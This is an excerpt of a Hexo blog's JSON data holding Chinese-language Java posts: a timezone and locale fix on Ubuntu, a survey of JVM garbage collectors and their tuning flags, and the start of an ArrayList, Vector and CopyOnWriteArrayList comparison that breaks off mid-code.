class=\"line\">LANGUAGE=&quot;zh_CN:zh&quot;</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>可以通过<code>locale -a</code>查看是否安装<code>zh_CN.UTF-8</code>字体，如未安装，通过<code>locale-gen zh_CN.UTF-8</code>命令安装</p>\n","site":{"data":{}},"excerpt":"","more":"<p>程序部署时出现Java时间不正确，Java里打印<code>new Date()</code>后发现输出的时区不是CST，是时区不正确导致的问题。针对该问题进行修复，修改时区设置，配置如下:</p>\n<ol>\n<li><p>修改<code>/etc/localtime</code>软链接指向为<code>/usr/share/zoneinfo/Asia/Shanghai</code></p>\n<blockquote>\n<p>ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</p>\n</blockquote>\n</li>\n</ol>\n<p>此时出现了一个很有意思的现象：shell执行打印时间的命令<code>date</code>，发现输出时区为CST，但Java打印 <code>new Date()</code>输出，时区仍旧不是CST</p>\n<ol start=\"2\">\n<li><p>修改<code>/etc/timezone</code>文件，将文件内唯一的一行<code>America/New_York</code>改为<code>Asia/Shanghai</code>，Java打印<code>new Date()</code>，输出时区为CST，修改成功</p>\n</li>\n<li><p>（相似的题外问题）如果需要修改系统字符集，可以修改<code>/etc/default/locale</code>（基于Ubuntu）文件设置为如下所示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LANG=&quot;zh_CN.UTF-8&quot;</span><br><span class=\"line\">LANGUAGE=&quot;zh_CN:zh&quot;</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>可以通过<code>locale -a</code>查看是否安装<code>zh_CN.UTF-8</code>字体，如未安装，通过<code>locale-gen zh_CN.UTF-8</code>命令安装</p>\n"},{"title":"JAVA垃圾收集器科普","date":"2019-07-16T20:36:17.000Z","keywords":"java, 垃圾收集器, jvm","rId":"MB-19071601","_content":"\n## Serial收集器（新生代）\n\n垃圾收集时，必须暂停其他所有工作线程（Stop The World)，采用的是复制回收算法，单线程收集\n\n## Serial Old搜集器（老年代）\n\nSerial收集器的老年代版本\n\n## ParNew收集器（新生代）\n\nserial收集器的多线程版本，没有太多的提升\n\n## Parallel Scavenge收集器（新生代）\n\n复制回收算法，并发多线程收集器，特点是与其他关注缩短垃圾收集时停顿时间的收集器的关注点不同，目标是达到可控的吞吐量（=运行用户代码时间/(运行用户代码时间 + 垃圾收集时间)），参数的两种设置方式：\n\n1. 使用`-XX:MaxGCPauseMillis`参数，直接制定大于0的毫秒数，收集器将尽可能地保证手机时间不超过设定值。但如果值设定过小，可能导致频繁垃圾回收。\n2. 使用`-XX:GCTimeRatio`参数，设定值大于0小于100整数，如果设定49，则GC时间占总时间的2%（1 / (1 + 49)），默认值为99.\n\n另外还有一个常用参数`-XX:+UseAdaptiveSizePolicy`，是开关参数，设定后无需手工指定新生代、Eden区、Survivor区的比例、晋升老年代年龄（`-XX:PretenureSizeThreshold`），虚拟机将自动调整这些参数以提供最适合的停顿时间和吞吐量。\n\n## Parallel Old收集器（老年代）\n\nParallel Scavenge收集器的老年代版本\n\n## CMS收集器（老年代）\n\nCMS(Concurrent Mark Sweep)收集器，是有较大提升的一个版本，采用的是标记清清理算法，同时是地一个真正意义上的并发收集器，以获取最短回收停顿时间为目标。\n\n垃圾收集过程分为4个步骤：\n\n1. 初始标记\n2. 并发标记\n3. 重新标记\n4. 并发清除\n\n初始标记、重新标记两个步骤仍旧需要\"Stop The World\"，但这两个阶段都是耗时比较短的阶段。初始标记，只是标记GC Roots能够直接到达的对象，速度很快；并发标记阶段为进行GC Tracing的过程；重新标记阶段为了修正并发标记期间用户程序继续运作而导致的标记变动部分记录，比初始标记阶段时间稍长，但远低于并发标记阶段。\n\n不足点：\n\n1. 并发程序的通病，对CPU资源敏感，线程占用资源不可避免的导致程序变慢（吞吐量降低），及线程切换的消耗，默认启动的线程数量（(CPU数量 + 3)  / 4）。\n2. 标记清楚回收算法的常见问题，导致内存空间的碎片，碎片过多大对象分配会带来麻烦，无法找到足够大空间时，不得不提前触发Full GC。参数`-XX:+UseCMSCompactAtFullCollection`用于在CMS收集器顶不住要FullGC时开启碎片压缩整合（默认即是开启的），但整合过程无法并发。参数`-XX:CMSFullGCsBeforeCompaction`设置多少次不压缩后执行一次压缩整合（默认值0）\n3. 收集器运行时需要为浮动垃圾（并发搜集阶段用户线程仍在运行而产生的垃圾）预留足够内存空间，浮动垃圾在下一次GC时清理掉，因此不能像其他收集器一样等到几乎被填满时再进行收集。JDK1.5中默认68%空间时收集，JDK1.6中为92%，使用`-XX:CMSInitiatingOccupancyFraction`参数设置百分比。\n4. concurrent mark时预留的内存无法满足程序需要，会导致`Concurrent Mode Failure`失败，这是虚拟机启用后备预案，临时使用Serial Old收集器重新进行老年代的垃圾收集。\n5. CMS作为老年代收集器，无法与Parallel Scavenge收集器配合使用，只能与Serial收集器或ParNew收集器配合使用\n\n## G1收集器（不再物理性分代）\n\n最新的收集器，目标替换CMS收集器，仍需要更多的检验。从2004年论文发布起，近10年时间才推出的G1收集器的商用版本，采用化整为零的思路，将Java堆分成多个Region进行管理。但由于对象的引用实现上并没有看起来这么简单，与新生代老年代类似，每个Region区均为此留出了Remembered Set来避免全堆扫描。\n\nG1收集器运行大致分为4个步骤：\n\n1. 初始标记\n2. 并发标记\n3. 最终标记\n4. 筛选回收\n\n4个阶段与CMS收集器相似，在最终标记阶段，将并发阶段写在线程Remembered Set Logs里的标记变动记录合并到Remembered Set中。筛选回收阶段对各个Region回收价值和成本先进行排序，根据用户期望GC停顿时间来制定回收计划。\n\nG1收集器特点：\n\n1. 并行与并发，多CPU环境缩短Stop-The-World\n2. 将整个Java堆分成多个大小相等的独立的Region，分代概念仍在G1收集器保留，但新生代和老年代不再是物理隔离的了，它们都是一部分Region的集合\n3. 可以不需要其他收集器配合就能独立管理整个GC堆，并能够采用不同方式处理新创建的和旧的对象\n4. 整体上采用\"标记-整理\"算法，局部（两个Region之间）基于\"复制回收\"算法\n5. 一大特色优势点，可预测的停顿。与CMS收集器一样关注降低停顿时间之外，还建立了可预测的停顿时间模型，能让使用者明确指定控制在长度为M的毫秒时间片段内，消耗在垃圾收集上的时间不超过N毫秒。\n\n可预测的停顿，建立在有计划地避免在整个Java堆中进行全区域垃圾收集，G1跟踪各个Region里的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先级列表，每次根据允许的收集时间优先回收高价值Region （这也是Garbage-First名称的由来）。\n\nSun给出测试结果显示，G1收集器对停顿时间的控制比CMS要更加地稳定可靠得多。","source":"_posts/2019-07-16_java_garbage_collector.md","raw":"---\ntitle: JAVA垃圾收集器科普\ndate: 2019-07-17 04:36:17\ntags: java\npermalink: java-garbage-collector\nkeywords: java, 垃圾收集器, jvm\nrId: MB-19071601\n---\n\n## Serial收集器（新生代）\n\n垃圾收集时，必须暂停其他所有工作线程（Stop The World)，采用的是复制回收算法，单线程收集\n\n## Serial Old搜集器（老年代）\n\nSerial收集器的老年代版本\n\n## ParNew收集器（新生代）\n\nserial收集器的多线程版本，没有太多的提升\n\n## Parallel Scavenge收集器（新生代）\n\n复制回收算法，并发多线程收集器，特点是与其他关注缩短垃圾收集时停顿时间的收集器的关注点不同，目标是达到可控的吞吐量（=运行用户代码时间/(运行用户代码时间 + 垃圾收集时间)），参数的两种设置方式：\n\n1. 使用`-XX:MaxGCPauseMillis`参数，直接制定大于0的毫秒数，收集器将尽可能地保证手机时间不超过设定值。但如果值设定过小，可能导致频繁垃圾回收。\n2. 使用`-XX:GCTimeRatio`参数，设定值大于0小于100整数，如果设定49，则GC时间占总时间的2%（1 / (1 + 49)），默认值为99.\n\n另外还有一个常用参数`-XX:+UseAdaptiveSizePolicy`，是开关参数，设定后无需手工指定新生代、Eden区、Survivor区的比例、晋升老年代年龄（`-XX:PretenureSizeThreshold`），虚拟机将自动调整这些参数以提供最适合的停顿时间和吞吐量。\n\n## Parallel Old收集器（老年代）\n\nParallel Scavenge收集器的老年代版本\n\n## CMS收集器（老年代）\n\nCMS(Concurrent Mark Sweep)收集器，是有较大提升的一个版本，采用的是标记清清理算法，同时是地一个真正意义上的并发收集器，以获取最短回收停顿时间为目标。\n\n垃圾收集过程分为4个步骤：\n\n1. 初始标记\n2. 并发标记\n3. 重新标记\n4. 并发清除\n\n初始标记、重新标记两个步骤仍旧需要\"Stop The World\"，但这两个阶段都是耗时比较短的阶段。初始标记，只是标记GC Roots能够直接到达的对象，速度很快；并发标记阶段为进行GC Tracing的过程；重新标记阶段为了修正并发标记期间用户程序继续运作而导致的标记变动部分记录，比初始标记阶段时间稍长，但远低于并发标记阶段。\n\n不足点：\n\n1. 并发程序的通病，对CPU资源敏感，线程占用资源不可避免的导致程序变慢（吞吐量降低），及线程切换的消耗，默认启动的线程数量（(CPU数量 + 3)  / 4）。\n2. 标记清楚回收算法的常见问题，导致内存空间的碎片，碎片过多大对象分配会带来麻烦，无法找到足够大空间时，不得不提前触发Full GC。参数`-XX:+UseCMSCompactAtFullCollection`用于在CMS收集器顶不住要FullGC时开启碎片压缩整合（默认即是开启的），但整合过程无法并发。参数`-XX:CMSFullGCsBeforeCompaction`设置多少次不压缩后执行一次压缩整合（默认值0）\n3. 收集器运行时需要为浮动垃圾（并发搜集阶段用户线程仍在运行而产生的垃圾）预留足够内存空间，浮动垃圾在下一次GC时清理掉，因此不能像其他收集器一样等到几乎被填满时再进行收集。JDK1.5中默认68%空间时收集，JDK1.6中为92%，使用`-XX:CMSInitiatingOccupancyFraction`参数设置百分比。\n4. concurrent mark时预留的内存无法满足程序需要，会导致`Concurrent Mode Failure`失败，这是虚拟机启用后备预案，临时使用Serial Old收集器重新进行老年代的垃圾收集。\n5. CMS作为老年代收集器，无法与Parallel Scavenge收集器配合使用，只能与Serial收集器或ParNew收集器配合使用\n\n## G1收集器（不再物理性分代）\n\n最新的收集器，目标替换CMS收集器，仍需要更多的检验。从2004年论文发布起，近10年时间才推出的G1收集器的商用版本，采用化整为零的思路，将Java堆分成多个Region进行管理。但由于对象的引用实现上并没有看起来这么简单，与新生代老年代类似，每个Region区均为此留出了Remembered Set来避免全堆扫描。\n\nG1收集器运行大致分为4个步骤：\n\n1. 初始标记\n2. 并发标记\n3. 最终标记\n4. 筛选回收\n\n4个阶段与CMS收集器相似，在最终标记阶段，将并发阶段写在线程Remembered Set Logs里的标记变动记录合并到Remembered Set中。筛选回收阶段对各个Region回收价值和成本先进行排序，根据用户期望GC停顿时间来制定回收计划。\n\nG1收集器特点：\n\n1. 并行与并发，多CPU环境缩短Stop-The-World\n2. 将整个Java堆分成多个大小相等的独立的Region，分代概念仍在G1收集器保留，但新生代和老年代不再是物理隔离的了，它们都是一部分Region的集合\n3. 可以不需要其他收集器配合就能独立管理整个GC堆，并能够采用不同方式处理新创建的和旧的对象\n4. 整体上采用\"标记-整理\"算法，局部（两个Region之间）基于\"复制回收\"算法\n5. 一大特色优势点，可预测的停顿。与CMS收集器一样关注降低停顿时间之外，还建立了可预测的停顿时间模型，能让使用者明确指定控制在长度为M的毫秒时间片段内，消耗在垃圾收集上的时间不超过N毫秒。\n\n可预测的停顿，建立在有计划地避免在整个Java堆中进行全区域垃圾收集，G1跟踪各个Region里的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先级列表，每次根据允许的收集时间优先回收高价值Region （这也是Garbage-First名称的由来）。\n\nSun给出测试结果显示，G1收集器对停顿时间的控制比CMS要更加地稳定可靠得多。","slug":"java-garbage-collector","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06d001ig0ukt56bdsex","content":"<h2 id=\"Serial收集器（新生代）\"><a href=\"#Serial收集器（新生代）\" class=\"headerlink\" title=\"Serial收集器（新生代）\"></a>Serial收集器（新生代）</h2><p>垃圾收集时，必须暂停其他所有工作线程（Stop The World)，采用的是复制回收算法，单线程收集</p>\n<h2 id=\"Serial-Old搜集器（老年代）\"><a href=\"#Serial-Old搜集器（老年代）\" class=\"headerlink\" title=\"Serial Old搜集器（老年代）\"></a>Serial Old搜集器（老年代）</h2><p>Serial收集器的老年代版本</p>\n<h2 id=\"ParNew收集器（新生代）\"><a href=\"#ParNew收集器（新生代）\" class=\"headerlink\" title=\"ParNew收集器（新生代）\"></a>ParNew收集器（新生代）</h2><p>serial收集器的多线程版本，没有太多的提升</p>\n<h2 id=\"Parallel-Scavenge收集器（新生代）\"><a href=\"#Parallel-Scavenge收集器（新生代）\" class=\"headerlink\" title=\"Parallel Scavenge收集器（新生代）\"></a>Parallel Scavenge收集器（新生代）</h2><p>复制回收算法，并发多线程收集器，特点是与其他关注缩短垃圾收集时停顿时间的收集器的关注点不同，目标是达到可控的吞吐量（=运行用户代码时间/(运行用户代码时间 + 垃圾收集时间)），参数的两种设置方式：</p>\n<ol>\n<li>使用<code>-XX:MaxGCPauseMillis</code>参数，直接制定大于0的毫秒数，收集器将尽可能地保证手机时间不超过设定值。但如果值设定过小，可能导致频繁垃圾回收。</li>\n<li>使用<code>-XX:GCTimeRatio</code>参数，设定值大于0小于100整数，如果设定49，则GC时间占总时间的2%（1 / (1 + 49)），默认值为99.</li>\n</ol>\n<p>另外还有一个常用参数<code>-XX:+UseAdaptiveSizePolicy</code>，是开关参数，设定后无需手工指定新生代、Eden区、Survivor区的比例、晋升老年代年龄（<code>-XX:PretenureSizeThreshold</code>），虚拟机将自动调整这些参数以提供最适合的停顿时间和吞吐量。</p>\n<h2 id=\"Parallel-Old收集器（老年代）\"><a href=\"#Parallel-Old收集器（老年代）\" class=\"headerlink\" title=\"Parallel Old收集器（老年代）\"></a>Parallel Old收集器（老年代）</h2><p>Parallel Scavenge收集器的老年代版本</p>\n<h2 id=\"CMS收集器（老年代）\"><a href=\"#CMS收集器（老年代）\" class=\"headerlink\" title=\"CMS收集器（老年代）\"></a>CMS收集器（老年代）</h2><p>CMS(Concurrent Mark Sweep)收集器，是有较大提升的一个版本，采用的是标记清清理算法，同时是地一个真正意义上的并发收集器，以获取最短回收停顿时间为目标。</p>\n<p>垃圾收集过程分为4个步骤：</p>\n<ol>\n<li>初始标记</li>\n<li>并发标记</li>\n<li>重新标记</li>\n<li>并发清除</li>\n</ol>\n<p>初始标记、重新标记两个步骤仍旧需要”Stop The World”，但这两个阶段都是耗时比较短的阶段。初始标记，只是标记GC Roots能够直接到达的对象，速度很快；并发标记阶段为进行GC Tracing的过程；重新标记阶段为了修正并发标记期间用户程序继续运作而导致的标记变动部分记录，比初始标记阶段时间稍长，但远低于并发标记阶段。</p>\n<p>不足点：</p>\n<ol>\n<li>并发程序的通病，对CPU资源敏感，线程占用资源不可避免的导致程序变慢（吞吐量降低），及线程切换的消耗，默认启动的线程数量（(CPU数量 + 3)  / 4）。</li>\n<li>标记清楚回收算法的常见问题，导致内存空间的碎片，碎片过多大对象分配会带来麻烦，无法找到足够大空间时，不得不提前触发Full GC。参数<code>-XX:+UseCMSCompactAtFullCollection</code>用于在CMS收集器顶不住要FullGC时开启碎片压缩整合（默认即是开启的），但整合过程无法并发。参数<code>-XX:CMSFullGCsBeforeCompaction</code>设置多少次不压缩后执行一次压缩整合（默认值0）</li>\n<li>收集器运行时需要为浮动垃圾（并发搜集阶段用户线程仍在运行而产生的垃圾）预留足够内存空间，浮动垃圾在下一次GC时清理掉，因此不能像其他收集器一样等到几乎被填满时再进行收集。JDK1.5中默认68%空间时收集，JDK1.6中为92%，使用<code>-XX:CMSInitiatingOccupancyFraction</code>参数设置百分比。</li>\n<li>concurrent mark时预留的内存无法满足程序需要，会导致<code>Concurrent Mode Failure</code>失败，这是虚拟机启用后备预案，临时使用Serial Old收集器重新进行老年代的垃圾收集。</li>\n<li>CMS作为老年代收集器，无法与Parallel Scavenge收集器配合使用，只能与Serial收集器或ParNew收集器配合使用</li>\n</ol>\n<h2 id=\"G1收集器（不再物理性分代）\"><a href=\"#G1收集器（不再物理性分代）\" class=\"headerlink\" title=\"G1收集器（不再物理性分代）\"></a>G1收集器（不再物理性分代）</h2><p>最新的收集器，目标替换CMS收集器，仍需要更多的检验。从2004年论文发布起，近10年时间才推出的G1收集器的商用版本，采用化整为零的思路，将Java堆分成多个Region进行管理。但由于对象的引用实现上并没有看起来这么简单，与新生代老年代类似，每个Region区均为此留出了Remembered Set来避免全堆扫描。</p>\n<p>G1收集器运行大致分为4个步骤：</p>\n<ol>\n<li>初始标记</li>\n<li>并发标记</li>\n<li>最终标记</li>\n<li>筛选回收</li>\n</ol>\n<p>4个阶段与CMS收集器相似，在最终标记阶段，将并发阶段写在线程Remembered Set Logs里的标记变动记录合并到Remembered Set中。筛选回收阶段对各个Region回收价值和成本先进行排序，根据用户期望GC停顿时间来制定回收计划。</p>\n<p>G1收集器特点：</p>\n<ol>\n<li>并行与并发，多CPU环境缩短Stop-The-World</li>\n<li>将整个Java堆分成多个大小相等的独立的Region，分代概念仍在G1收集器保留，但新生代和老年代不再是物理隔离的了，它们都是一部分Region的集合</li>\n<li>可以不需要其他收集器配合就能独立管理整个GC堆，并能够采用不同方式处理新创建的和旧的对象</li>\n<li>整体上采用”标记-整理”算法，局部（两个Region之间）基于”复制回收”算法</li>\n<li>一大特色优势点，可预测的停顿。与CMS收集器一样关注降低停顿时间之外，还建立了可预测的停顿时间模型，能让使用者明确指定控制在长度为M的毫秒时间片段内，消耗在垃圾收集上的时间不超过N毫秒。</li>\n</ol>\n<p>可预测的停顿，建立在有计划地避免在整个Java堆中进行全区域垃圾收集，G1跟踪各个Region里的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先级列表，每次根据允许的收集时间优先回收高价值Region （这也是Garbage-First名称的由来）。</p>\n<p>Sun给出测试结果显示，G1收集器对停顿时间的控制比CMS要更加地稳定可靠得多。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Serial收集器（新生代）\"><a href=\"#Serial收集器（新生代）\" class=\"headerlink\" title=\"Serial收集器（新生代）\"></a>Serial收集器（新生代）</h2><p>垃圾收集时，必须暂停其他所有工作线程（Stop The World)，采用的是复制回收算法，单线程收集</p>\n<h2 id=\"Serial-Old搜集器（老年代）\"><a href=\"#Serial-Old搜集器（老年代）\" class=\"headerlink\" title=\"Serial Old搜集器（老年代）\"></a>Serial Old搜集器（老年代）</h2><p>Serial收集器的老年代版本</p>\n<h2 id=\"ParNew收集器（新生代）\"><a href=\"#ParNew收集器（新生代）\" class=\"headerlink\" title=\"ParNew收集器（新生代）\"></a>ParNew收集器（新生代）</h2><p>serial收集器的多线程版本，没有太多的提升</p>\n<h2 id=\"Parallel-Scavenge收集器（新生代）\"><a href=\"#Parallel-Scavenge收集器（新生代）\" class=\"headerlink\" title=\"Parallel Scavenge收集器（新生代）\"></a>Parallel Scavenge收集器（新生代）</h2><p>复制回收算法，并发多线程收集器，特点是与其他关注缩短垃圾收集时停顿时间的收集器的关注点不同，目标是达到可控的吞吐量（=运行用户代码时间/(运行用户代码时间 + 垃圾收集时间)），参数的两种设置方式：</p>\n<ol>\n<li>使用<code>-XX:MaxGCPauseMillis</code>参数，直接制定大于0的毫秒数，收集器将尽可能地保证手机时间不超过设定值。但如果值设定过小，可能导致频繁垃圾回收。</li>\n<li>使用<code>-XX:GCTimeRatio</code>参数，设定值大于0小于100整数，如果设定49，则GC时间占总时间的2%（1 / (1 + 49)），默认值为99.</li>\n</ol>\n<p>另外还有一个常用参数<code>-XX:+UseAdaptiveSizePolicy</code>，是开关参数，设定后无需手工指定新生代、Eden区、Survivor区的比例、晋升老年代年龄（<code>-XX:PretenureSizeThreshold</code>），虚拟机将自动调整这些参数以提供最适合的停顿时间和吞吐量。</p>\n<h2 id=\"Parallel-Old收集器（老年代）\"><a href=\"#Parallel-Old收集器（老年代）\" class=\"headerlink\" title=\"Parallel Old收集器（老年代）\"></a>Parallel Old收集器（老年代）</h2><p>Parallel Scavenge收集器的老年代版本</p>\n<h2 id=\"CMS收集器（老年代）\"><a href=\"#CMS收集器（老年代）\" class=\"headerlink\" title=\"CMS收集器（老年代）\"></a>CMS收集器（老年代）</h2><p>CMS(Concurrent Mark Sweep)收集器，是有较大提升的一个版本，采用的是标记清清理算法，同时是地一个真正意义上的并发收集器，以获取最短回收停顿时间为目标。</p>\n<p>垃圾收集过程分为4个步骤：</p>\n<ol>\n<li>初始标记</li>\n<li>并发标记</li>\n<li>重新标记</li>\n<li>并发清除</li>\n</ol>\n<p>初始标记、重新标记两个步骤仍旧需要”Stop The World”，但这两个阶段都是耗时比较短的阶段。初始标记，只是标记GC Roots能够直接到达的对象，速度很快；并发标记阶段为进行GC Tracing的过程；重新标记阶段为了修正并发标记期间用户程序继续运作而导致的标记变动部分记录，比初始标记阶段时间稍长，但远低于并发标记阶段。</p>\n<p>不足点：</p>\n<ol>\n<li>并发程序的通病，对CPU资源敏感，线程占用资源不可避免的导致程序变慢（吞吐量降低），及线程切换的消耗，默认启动的线程数量（(CPU数量 + 3)  / 4）。</li>\n<li>标记清楚回收算法的常见问题，导致内存空间的碎片，碎片过多大对象分配会带来麻烦，无法找到足够大空间时，不得不提前触发Full GC。参数<code>-XX:+UseCMSCompactAtFullCollection</code>用于在CMS收集器顶不住要FullGC时开启碎片压缩整合（默认即是开启的），但整合过程无法并发。参数<code>-XX:CMSFullGCsBeforeCompaction</code>设置多少次不压缩后执行一次压缩整合（默认值0）</li>\n<li>收集器运行时需要为浮动垃圾（并发搜集阶段用户线程仍在运行而产生的垃圾）预留足够内存空间，浮动垃圾在下一次GC时清理掉，因此不能像其他收集器一样等到几乎被填满时再进行收集。JDK1.5中默认68%空间时收集，JDK1.6中为92%，使用<code>-XX:CMSInitiatingOccupancyFraction</code>参数设置百分比。</li>\n<li>concurrent mark时预留的内存无法满足程序需要，会导致<code>Concurrent Mode Failure</code>失败，这是虚拟机启用后备预案，临时使用Serial Old收集器重新进行老年代的垃圾收集。</li>\n<li>CMS作为老年代收集器，无法与Parallel Scavenge收集器配合使用，只能与Serial收集器或ParNew收集器配合使用</li>\n</ol>\n<h2 id=\"G1收集器（不再物理性分代）\"><a href=\"#G1收集器（不再物理性分代）\" class=\"headerlink\" title=\"G1收集器（不再物理性分代）\"></a>G1收集器（不再物理性分代）</h2><p>最新的收集器，目标替换CMS收集器，仍需要更多的检验。从2004年论文发布起，近10年时间才推出的G1收集器的商用版本，采用化整为零的思路，将Java堆分成多个Region进行管理。但由于对象的引用实现上并没有看起来这么简单，与新生代老年代类似，每个Region区均为此留出了Remembered Set来避免全堆扫描。</p>\n<p>G1收集器运行大致分为4个步骤：</p>\n<ol>\n<li>初始标记</li>\n<li>并发标记</li>\n<li>最终标记</li>\n<li>筛选回收</li>\n</ol>\n<p>4个阶段与CMS收集器相似，在最终标记阶段，将并发阶段写在线程Remembered Set Logs里的标记变动记录合并到Remembered Set中。筛选回收阶段对各个Region回收价值和成本先进行排序，根据用户期望GC停顿时间来制定回收计划。</p>\n<p>G1收集器特点：</p>\n<ol>\n<li>并行与并发，多CPU环境缩短Stop-The-World</li>\n<li>将整个Java堆分成多个大小相等的独立的Region，分代概念仍在G1收集器保留，但新生代和老年代不再是物理隔离的了，它们都是一部分Region的集合</li>\n<li>可以不需要其他收集器配合就能独立管理整个GC堆，并能够采用不同方式处理新创建的和旧的对象</li>\n<li>整体上采用”标记-整理”算法，局部（两个Region之间）基于”复制回收”算法</li>\n<li>一大特色优势点，可预测的停顿。与CMS收集器一样关注降低停顿时间之外，还建立了可预测的停顿时间模型，能让使用者明确指定控制在长度为M的毫秒时间片段内，消耗在垃圾收集上的时间不超过N毫秒。</li>\n</ol>\n<p>可预测的停顿，建立在有计划地避免在整个Java堆中进行全区域垃圾收集，G1跟踪各个Region里的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先级列表，每次根据允许的收集时间优先回收高价值Region （这也是Garbage-First名称的由来）。</p>\n<p>Sun给出测试结果显示，G1收集器对停顿时间的控制比CMS要更加地稳定可靠得多。</p>\n"},{"title":"ArrayList、Vector、CopyOnWriteArrayList对比","date":"2019-07-29T11:33:16.000Z","keywords":"比较, ArrayList, Vector, CopyOnWriteArrayList","rId":"MB-19072901","_content":"\nArrayList、Vector、CopyOnWriteArrayList均是实现了List接口的容器，他们之间究竟有何区别？为何JDK要同时提供这三种List？本文针对这个问题，进行深入的探究。\n\n## ArrayList\n\n### 1. 研究一个类源码，首先了解它有哪些成员变量\n\n查看ArrayList源码，可以很清除的看到，ArrayList最主要的成员变量就两个，变量的作用很明显，存储对象数组和记录数组内存储的变量个数，ArrayList内元素是以Array方式存储的，所以叫做ArrayList\n\n```\n/**\n* The array buffer into which the elements of the ArrayList are stored.\n* The capacity of the ArrayList is the length of this array buffer. Any\n* empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA\n* will be expanded to DEFAULT_CAPACITY when the first element is added.\n*/\ntransient Object[] elementData; // non-private to simplify nested class access\n\n/**\n* The size of the ArrayList (the number of elements it contains).\n*\n* @serial\n*/\nprivate int size;\n```\n\n### 2. 针对特征功能的探究\n\nArrayList之所以是一个List，而不是Array，就在于ArrayList长度可以扩展，这里探究它在add元素时是如何进行扩容的。\n\n查看add代码\n\n```\n/**\n* Appends the specified element to the end of this list.\n*\n* @param e element to be appended to this list\n* @return <tt>true</tt> (as specified by {@link Collection#add})\n*/\npublic boolean add(E e) {\n    ensureCapacityInternal(size + 1);  // Increments modCount!!\n    elementData[size++] = e;\n    return true;\n}\n```\n\n可以看出ArrayList的扩容是在ensureCapacityInternal方法中完成的，按着ensureCapacityInternal方法顺藤摸瓜可以找到grow方法这里才是真正的扩容代码，可以看出ArrayList扩容是直接用新的更长的数组替换掉旧的elementData数组，扩容后新容量是扩容前的容量的1.5倍，并与实际需求容量取最大值。\n\n```\n/**\n* Increases the capacity to ensure that it can hold at least the\n* number of elements specified by the minimum capacity argument.\n*\n* @param minCapacity the desired minimum capacity\n*/\nprivate void grow(int minCapacity) {\n    // overflow-conscious code\n    int oldCapacity = elementData.length;\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n    if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n    // minCapacity is usually close to size, so this is a win:\n    elementData = Arrays.copyOf(elementData, newCapacity);\n}\n```\n\n## Vector\n\nVector类相比较ArrayList类，在成员变量上多了一个`protected int capacityIncrement`变量，主要用于扩容时的容量增长的计算，也就是说，Vector容量增长值的算法与ArrayList是有所不同的。\n\n将关注点置于Vector与ArrayList类的不同点上，阅读源码可发现Vector类在`get`、`add`、`set`、`addAll`、`forEach`、`toArray`等方法上，均加了`synchronized`关键字，这里可以看出，Vector类与ArrayList相比增加了线程安全方面的考虑。\n\n## CopyOnWriteArrayList\n\n成员变量上，主要增加了一个ReentrantLock变量。\n\n```\n/** The lock protecting all mutators */\nfinal transient ReentrantLock lock = new ReentrantLock();\n\n/** The array, accessed only via getArray/setArray. */\nprivate transient volatile Object[] array;\n```\n\n了解`ReentrantLock`类的都知道，这是一个可重入锁，也就是说CopyOnWriteArrayList和Vector一样都有线程安全方面的考虑。那CopyOnWriteArrayList和Vector的区别是什么呢？\n\n阅读CopyOnWriteArrayList源码发现，CopyOnWriteArrayList类在`get`、`forEach`、`toArray`等读的方法上，并没有加锁。在`add`、`set`、`addAll`等写的方法上除了使用了ReentrantLock锁之外，还增加了Array Copy的操作，使用Copy出的新的Array替换了就的Array，也正是因为这个操作，使得CopyOnWriteArrayList类在写的操作上不需要加锁。\n\n## 总结\n\nArrayList与 CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList和Vector是线程安全的，ArrayList不是线程安全的。CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList读时不加锁，Vector读时加锁，CopyOnWriteArrayList写时进行了Array的拷贝，而Vector不进行拷贝。从性能上看，不加锁的ArrayList读写速度肯定都是最快的，而Vector写的速度比CopyOnWriteArrayList快，CopyOnWriteArrayList读的速度比Vector块。\n\n","source":"_posts/2019-07-29_Source_List_Vector_COWList.md","raw":"---\ntitle: ArrayList、Vector、CopyOnWriteArrayList对比\ndate: 2019-07-29 19:33:16\ntags: java\npermalink: compare-list-vertor-cowlist\nkeywords: 比较, ArrayList, Vector, CopyOnWriteArrayList\nrId: MB-19072901\n---\n\nArrayList、Vector、CopyOnWriteArrayList均是实现了List接口的容器，他们之间究竟有何区别？为何JDK要同时提供这三种List？本文针对这个问题，进行深入的探究。\n\n## ArrayList\n\n### 1. 研究一个类源码，首先了解它有哪些成员变量\n\n查看ArrayList源码，可以很清除的看到，ArrayList最主要的成员变量就两个，变量的作用很明显，存储对象数组和记录数组内存储的变量个数，ArrayList内元素是以Array方式存储的，所以叫做ArrayList\n\n```\n/**\n* The array buffer into which the elements of the ArrayList are stored.\n* The capacity of the ArrayList is the length of this array buffer. Any\n* empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA\n* will be expanded to DEFAULT_CAPACITY when the first element is added.\n*/\ntransient Object[] elementData; // non-private to simplify nested class access\n\n/**\n* The size of the ArrayList (the number of elements it contains).\n*\n* @serial\n*/\nprivate int size;\n```\n\n### 2. 针对特征功能的探究\n\nArrayList之所以是一个List，而不是Array，就在于ArrayList长度可以扩展，这里探究它在add元素时是如何进行扩容的。\n\n查看add代码\n\n```\n/**\n* Appends the specified element to the end of this list.\n*\n* @param e element to be appended to this list\n* @return <tt>true</tt> (as specified by {@link Collection#add})\n*/\npublic boolean add(E e) {\n    ensureCapacityInternal(size + 1);  // Increments modCount!!\n    elementData[size++] = e;\n    return 